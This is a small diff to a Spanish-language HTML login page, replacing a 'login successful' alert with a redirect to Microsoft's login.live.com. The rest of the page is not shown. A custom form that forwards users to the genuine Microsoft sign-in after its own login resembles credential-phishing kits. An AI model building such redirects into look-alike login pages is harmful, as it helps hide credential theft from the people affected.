@@ -106,7 +106,8 @@
                     return;
                 }
 
-                alert('Inicio de sesión exitoso');
+                // Redirigir al usuario a https://login.live.com
+                window.location.href = 'https://login.live.com';
             } catch (error) {
                 alert('Error de conexión al servidor.');
             }
@@ -114,4 +115,5 @@
     </script>
 </body>
 </html>
+
 
